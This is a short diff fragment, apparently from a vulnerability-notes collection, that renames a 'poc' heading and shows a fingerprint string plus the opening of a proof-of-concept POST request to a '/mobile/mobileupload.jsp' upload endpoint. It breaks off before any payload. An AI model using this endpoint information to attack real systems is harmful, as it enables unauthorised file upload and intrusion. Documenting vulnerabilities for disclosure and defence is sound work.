@@ -8,7 +8,7 @@
 body="/common/scripts/basic.js"
 ```
 
-## poc
+## POC
 ```
 POST /mobile/mobileupload.jsp HTTP/1.1
 Host: metasoft.mrxn.net
